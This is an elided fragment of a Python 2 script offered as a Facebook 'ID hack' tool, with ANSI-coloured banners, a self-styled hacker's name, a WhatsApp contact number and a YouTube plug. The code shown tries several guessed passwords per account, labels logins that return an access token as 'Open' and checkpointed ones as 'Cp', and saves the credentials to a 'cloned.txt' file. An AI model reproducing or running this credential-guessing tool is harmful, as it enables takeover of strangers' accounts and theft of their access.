...
\033[1;96m---------------------ZAIN UR D4D---------------------
                
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m rai zain .                                
\033[0;91m║\033[0;91mWhatsapp number :\033[0;92m "+923483754508"                                             
\033[0;95m╰════════════════════════════════════════════╯
             
                
\033[1;96m-----------------Ruk Ja zaini----------------------
"""
...
\033[1;96m We are zainHacker💜
\033[1;96mOnly Pakistan Id Hack💜
 
\033[1;99m If you face any problem contact me on Whatsapp +923483754508💜
 
\033[1;96m------------------THE zain💜HACKER----------------------
...
\033[1;91m 🔴━━━❖❖Guru zain ❖❖━━━━🔴
\033[1;91m Subcribe My Youtube Channel follow
 
\033[1;96m--------------------- rai zain--------------------
 
    
 
\033[1;95mTAWADA OFFICAIL PAOO zain ”¹
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(zainOpen)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(zainCp) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(zain Open)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(zain Cp) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(zainCp) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(zainOpen)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
